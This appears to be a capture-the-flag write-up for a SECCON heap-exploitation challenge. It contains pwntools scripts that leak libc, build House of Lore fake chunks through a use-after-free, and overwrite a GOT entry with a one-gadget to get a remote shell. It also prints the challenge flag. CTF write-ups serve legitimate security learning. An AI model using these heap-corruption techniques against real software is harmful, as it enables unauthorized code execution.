```python title="LeakLibcAddress.py"
from pwn import *
#context.log_level = 'debug'

def login(id,pw):
    p.recvuntil('Enter your ID.')
    p.send(id)
    p.recvuntil('Enter your Password.')
    p.send(pw)

def setOrderlist(num):
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please pick up the candies to order.')
    p.send(num)
    p.recvuntil('Command : ')
    p.send('5')

def getOrderlist():
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('1')

def setOrder(price,desc):
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('0) Yes, 1) No')
    p.send('0')
    p.recvuntil('Enter the price of ')
    p.sendline(price)
    p.recvuntil('Enter a description of the')
    p.send(desc)
    p.recvuntil('Command : ')
    p.send('5')

def purchase(code,num,comment):
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please enter the code number of the candy to be purchased.')
    p.send(code)
    p.recvuntil('Please enter the number of the candy to purchase.')
    p.send(num)
    p.recvuntil('Please enter a comment for candy.')
    p.send(comment)

bin = ELF('./Lazenca.0x0')
p = remote('n8.pwn.tk.seccon.spica.bz',9999)

login('Admin','admin')

setOrderlist('1')
setOrder('10','TEST')

setOrderlist('1')
setOrderlist('1')

purchase('0','10','AA')

setOrderlist('1')

getOrderlist()

p.recvuntil('Order code  : ')
p.recvuntil('Order code  : ')
p.recvuntil('Order code  : ')
p.recv(1)
tmp = p.recv(5)
tmp = '\x00' + tmp
libcLeak = u64(tmp.ljust(8,'\x00'))
libcBase = libcLeak - 0x3c4c00
execve = libcBase + 0xF0274

log.info("Libc leak : " + hex(libcLeak))
log.info("Libc base: " + hex(libcBase))
log.info("execve : " + hex(execve))

p.recvuntil('Command : ')
p.send('5')
```

#### **House of lore(Fake chunk)**

* **The space allocated to the **"gAccount[1].fd" area must be reallocated to the "dest->candyDescription" area.****
  + The heap structure must be designed in advance to allocate the same area.
    - Cancel the 0th candy in the order list
    - Candy order completed
  + Create two new accounts.
* **Heap area structure**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Candy number 0 stored in the warehouse | 0xa175e0 | A | 0x20 | 0x0 | None |
| Order list[2] | 0xa17600 | F | 0x20 | None | None |
| Description of candy number 0 stored in warehouse | 0xa17620 | A | 0x90 | 0xa17600 | None |
| Order list[1] | 0xa176b0 | F | 0x20 | None | None |
| Evaluate purchased candy | 0xa176d0 | A | 0x4c0 | None | None |
| gAccount[1].fd | 0xA17B90 | A | 0x90 | None | None |
| gAccount[2].fd | 0xA17c20 | A | 0x90 | None | None |

* **You can create the Fake chunks needed for House of lore as follows:**  
  + You need to recharge using the account you created as follows.
    - 2nd account: 6308456 (0x604268)
    - 3rd account: 6308416 (0x604240)
  + Delete the second account.
* **You will have the following gAccount[] structure.**

```bash title="Heap Structure" 
gdb-peda$ x/8gx 0x604240
0x604240:	0x0000000000000000	0x0000000000000002
0x604250:	0x0000000001a08b90	0x0000000000604268
0x604260:	0x0000000000000003	0x0000000000000003
0x604270:	0x0000000001a08c30	0x0000000000604240
gdb-peda$
```

* **gAccount area structure**

|  |  |  |
| --- | --- | --- |
| 0x604240 | gAccount[1].state | gAccount[1].number |
| 0x604250 | gAccount[1].fd = 0xA17B90 | gAccount[1].bk = 0x604268 |
| 0x604260 | gAccount[2].state | gAccount[2].number |
| 0x604270 | gAccount[2].fd | gAccount[2].bk = 0x604240 |

* **It will have the following heap structure.**

```bash title="Heap Structure - debugging" 
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0xa17630         	0x20                 Freed     			  0x0    		   None
0xa17620            0x100006567         0x90                 Used      			 None    		   None
0xa176b0            0x90                0x20                 Freed           0xa17600              None
0xa176d0            0x100006567         0x4c0                Used                None              None
0xa17b90            0x0			        0x90                 Freed     0x7ff5052a2b78              0x7ff5052a2b78
0xa17c20            0x90         		0x90                 Used                None              None
gdb-peda$
```

* **Heap area structure**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Candy number 0 stored in the warehouse | 0xa175e0 | A | 0x20 | None | None |
| Order list[2] | 0xa17600 | F | 0x20 | 0x0 | None |
| Description of candy number 0 stored in warehouse | 0xa17620 | A | 0x90 | None | None |
| Order list[1] | 0xa176b0 | F | 0x20 | 0xa17600 | None |
| Evaluate purchased candy | 0xa176d0 | A | 0x4c0 | None | None |
| gAccount[1].fd(Unsortbin) | 0xA17B90 | F | 0x90 | 0x7ff5052a2b78 | 0x7ff5052a2b78 |
| gAccount[2].fd | 0xA17c20 | A | 0x90 | None | None |

#### **House of lore(Overwrite Smallbin bk)**

* **First, the attacker must manipulate the value of "gAccount[1].fd→state" as follows to overwrite the bk area.**
* **An attacker could use the UAF vulnerability as follows:**  
  + Add new candies to the order list and complete the order.  
    - At this time, the address of the “gAccount[1].fd + 0x10” area is saved in the “dest→candyDescription” area.
      * Save 16 or more characters in the area.
  + The value of "gAccount[1].fd→state" is changed as follows.

```
gdb-peda$ x/6gx 0x0000000002593b90
0xA17B90:	0x0000000000000000	0x0000000000000091
0xa17ba0:	0x4141414141414141	0x4141414141414141
0xa17bb0:	0x4141414141414141	0x0000000000000000
gdb-peda$
```

* **Heap area structure**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Candy number 0 stored in the warehouse | 0xa175e0 | A | 0x20 | None | None |
| Order list[0] | 0xa17600 | A | 0x20 | None | None |
| Description of candy number 0 stored in warehouse | 0xa17620 | A | 0x90 | None | None |
| Information on candy number 1 stored in warehouse | 0xa176b0 | F | 0x20 | 0x0 | None |
| Evaluate purchased candy | 0xa176d0 | A | 0x4c0 | None | None |
| Description of candy number 1 stored in warehouse | 0xA17B90 | A | 0x90 | None | None |
| gAccount[2].fd | 0xA17c20 | A | 0x90 | None | None |

* **Purchase candy number 1 as follows so that area 0xA17B90 is registered in Smallbin.**
  + Area 0xA17B90 has been registered in Smallbin[16], [17].

```bash title="Heap Structure - debugging" 
gdb-peda$ parseheap 
addr                prev                size                 status              fd                bk                
0xa17000            0x0                 0x90                 Used                None              None
0xa17090            0x0                 0x410                Used                None              None
0xa174a0            0x0                 0x20                 Used                None              None
0xa174c0            0x0                 0x20                 Used                None              None
0xa174e0            0x0                 0x20                 Used                None              None
0xa17500            0x0                 0x20                 Used                None              None
0xa17520            0x0                 0x20                 Used                None              None
0xa17540            0x0                 0x20                 Used                None              None
0xa17560            0x0                 0x20                 Used                None              None
0xa17580            0x0                 0x20                 Used                None              None
0xa175a0            0x0                 0x20                 Used                None              None
0xa175c0            0x0                 0x20                 Used                None              None
0xa175e0            0x0                 0x20                 Used                None              None
0xa17600            0xa17630         	0x20                 Freed     0x7ff5052a2b88    	   0xa176b0
0xa17620            0x100006567         0x90                 Used      			 None    		   None
0xa176b0            0x90                0x20                 Freed           0xa17600    0x7ff5052a2b88
0xa176d0            0x100006567         0x4c0                Used                None              None
0xa17b90            0x0			        0x90                 Freed     0x7ff5052a2bf8	 0x7ff5052a2bf8
0xa17c20            0x90         		0x90                 Used                None              None
0xa17cb0            0x90         		0x4c0                Used                None              None
gdb-peda$ p main_arena.bins[16]
$1 = (mchunkptr) 0xa17b90
gdb-peda$ p main_arena.bins[17]
$2 = (mchunkptr) 0xa17b90
gdb-peda$
```

* **Heap area structure**

|  | Addresss | State | Heap size | fd | bk |
| --- | --- | --- | --- | --- | --- |
| Candy number 0 stored in the warehouse | 0xa175e0 | A | 0x20 | None | None |
| Order list[0] | 0xa17600 | A | 0x20 | 0x7ff5052a2b88 | 0xa176b0 |
| Description of candy number 0 stored in warehouse | 0xa17620 | A | 0x90 | None | None |
| Information on candy number 1 stored in warehouse | 0xa176b0 | F | 0x20 | 0xa176b0 | 0x7ff5052a2b88 |
| Evaluate purchased candy | 0xa176d0 | A | 0x4c0 | None | None |
| Description of candy number 1 stored in warehouse | 0xA17B90 | A | 0x90 | 0x7ff5052a2bf8 | 0x7ff5052a2bf8 |
| gAccount[2].fd | 0xA17c20 | A | 0x90 | None | None |
| Evaluate purchased candy | 0xa17cb0 | A | 0x4c0 | None | None |

* **You can continue to change the value of the bk area by changing the password of account 2 as follows.**
  + The starting address of the first fake chunk is stored in the bk area.

```bash title="Heap Structure - debugging" 
gdb-peda$ x/6gx 0x9d4b90
0xA17B90:	0x0000000000000000	0x0000000000000091
0xa17ba0:	0x00007f91951a6bf8	0x0000000000604240
0xa17bb0:	0x4141414141414141	0x0000000000000000
gdb-peda$
```

* **You can save the address value of gAccount[1] in the main\_arena.bins[17] area in the following way.**
  + The attacker adds candy to the order list and completes the order.

```bash title="Overwrite Smallbin bk" 
gdb-peda$ p main_arena.bins[16]
$3 = (mchunkptr) 0xA17B90
gdb-peda$ p main_arena.bins[17]
$4 = (mchunkptr) 0x604240
gdb-peda$
```

* **The gAccount[] area can be assigned as follows.**
  + Buy all the candy you added earlier.
  + The attacker adds candy to the order list and completes the order.
    - At this time, the gAccount[1].fd area is allocated as the area where the candy description is entered.
    - You can change the value of the desired area in the following way.
      * gAccount[1].fd = "Address of the area you wish to access" - 0x18
      * You can use the second account's password change to save user input in the "area you want access to."

```bash title="Overwrite gAccount1.fd - debugging" 
Breakpoint 1, 0x000000000040123a in ?? ()
gdb-peda$ ni
0x000000000040123f in ?? ()
gdb-peda$ i r rax
rax            0x604250	0x604250
gdb-peda$ x/4gx 0x604250
0x604250:	0x00007f070160bbf8	0x0000000000604268
0x604260:	0x0000000000000003	0x0000000000000003
Breakpoint 2, 0x000000000040125f in ?? ()
gdb-peda$ x/4gx 0x604250
0x604250:	0x0a41414141414141	0x0000000000604268
0x604260:	0x0000000000000003	0x0000000000000003
gdb-peda$
```

#### **One Gadget**

* **You can use the following One Gadget:**
  + You can obtain the shell by overwriting the gadget in the fflush.got area.

```asm title="One Gadget" 
.text:00000000000F0274                 mov     rax, cs:environ_ptr_0
.text:00000000000F027B                 lea     rsi, [rsp+1B8h+var_168]
.text:00000000000F0280                 lea     rdi, aBinSh     ; "/bin/sh"
.text:00000000000F0287                 mov     rdx, [rax]
.text:00000000000F028A                 call    execve
```

## **Exploit Code**

```python title="pwn-online-candy-store.py" 
from pwn import *
#context.log_level = 'debug'

gAccount1bk = 0x604240
gAccount2fd = 0x604268

def fill(addr):
    tmp = int(addr)

    log.info('Original addresss(int) : ' + str(tmp) + ', (hex) : ' + hex(tmp))

    tmp -= 10000

    log.info('Addresss - 10000(int) : ' + str(tmp) + ', (hex) : ' + hex(tmp))

    tmp = str(tmp)
    for i in range(5):
        for j in range(int(tmp[6-i])):
            charge(str(i)) 

    for i in range(int(tmp[0:2])):
        charge('5')

def setAccount(id):
    p.recvuntil('Enter your ID.')
    p.send('a')
    p.recvuntil('Enter your Password.')
    p.send('a')
    p.recvuntil('Create an account?')
    p.send('0')
    p.recvuntil('Enter your New ID.')
    p.send(id)
    p.recvuntil('Enter your New Password.')
    p.send(id)
    p.recvuntil('Enter your profile.')
    p.send('TEST')

def login(id,pw):
    p.recvuntil('Enter your ID.')
    p.send(id)
    p.recvuntil('Enter your Password.')
    p.send(pw)

def logout():
    p.recvuntil('Command : ')
    p.send('9')
    p.recvuntil('1) No')
    p.send('0')

def delAccount(num):
    p.recvuntil('Command : ')
    p.send('5')
    p.recvuntil('Command : ')
    p.send('1')
    p.recvuntil('Please enter the number of the account you want to delete')
    p.send(num)
    p.recvuntil('Command : ')
    p.send('3')

def pwChange(num,pw):
    p.recvuntil('Command : ')
    p.send('5')
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please enter the number of the account you want to change PW')
    p.send(num)
    p.recvuntil('Enter your New Password.')
    p.send(pw)
    p.recvuntil('Command : ')
    p.send('3')

def charge(num):
    p.recvuntil('Command : ')
    p.send('3')
    p.recvuntil('5) 100000')
    p.send(num)

def setOrderlist(num):
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please pick up the candies to order.')
    p.send(num)
    p.recvuntil('Command : ')
    p.send('5')

def delOrderlist():
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('3')
    p.recvuntil('Candy code: ')
    p.send('0')
    p.recvuntil('Command : ')
    p.send('5')

def getOrderlist():
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('1')

def setOrder(price,desc):
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('Command : ')
    p.send('4')
    p.recvuntil('0) Yes, 1) No')
    p.send('0')
    p.recvuntil('Enter the price of ')
    p.sendline(price)
    p.recvuntil('Enter a description of the')
    p.send(desc)
    p.recvuntil('Command : ')
    p.send('5')

def purchase(code,num,comment):
    p.recvuntil('Command : ')
    p.send('2')
    p.recvuntil('Please enter the code number of the candy to be purchased.')
    p.send(code)
    p.recvuntil('Please enter the number of the candy to purchase.')
    p.send(num)
    p.recvuntil('Please enter a comment for candy.')
    p.send(comment)

bin = ELF('./Lazenca.0x0')
p = remote('n8.pwn.tk.seccon.spica.bz',9999)

signal = bin.got['signal']

login('Admin','admin')

setOrderlist('1')
setOrder('10','TEST')

setOrderlist('1')
setOrderlist('1')

purchase('0','10','AA')

setOrderlist('1')

getOrderlist()

p.recvuntil('Order code  : ')
p.recvuntil('Order code  : ')
p.recvuntil('Order code  : ')
p.recv(1)
tmp = p.recv(5)
tmp = '\x00' + tmp
libcLeak = u64(tmp.ljust(8,'\x00'))
libcBase = libcLeak - 0x3c4c00
execve = libcBase + 0xF0274

log.info("Libc leak : " + hex(libcLeak))
log.info("Libc base: " + hex(libcBase))
log.info("execve : " + hex(execve))

p.recvuntil('Command : ')
p.send('5')

#Design heap
delOrderlist()

setOrder('20','BB')

logout()

#Create account 1
setAccount('asdf')
login('asdf','asdf')
fill(gAccount2fd)
logout()

#Create account 2
setAccount('qwer')
login('qwer','qwer')
fill(gAccount1bk)
logout()

#Set gAccount[1].fd->state
login('Admin','admin')

delAccount('2')

setOrderlist('0')
setOrder('1','A'*24)

#register bins[16,17]
purchase('1','10','AA')

#Overwrite Smallbin bk
pwChange('2',p64(gAccount1bk))

setOrderlist('3')
setOrder('1','A'*24)

purchase('1','10','AA')

#Overwrite gAccount[1].fd
setOrderlist('2')
setOrder('1',p64(signal))

#Overwrite fflush.got
p.recvuntil('Command : ')
p.send('5')
p.recvuntil('Command : ')
p.send('2')
p.recvuntil('Please enter the number of the account you want to change PW')
p.send('2')
p.recvuntil('Enter your New Password.')
p.send(p64(execve))

#Get shell
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | SECCON&#123;Y0u h4ve 4cquired the "H0use 0f L0re" techn0l0gy. by Lazenca.0x0&#125; |

## **Related Site**

* <https://gist.github.com/Charo-IT/aae574aef2145d454e196a9842cad4b5>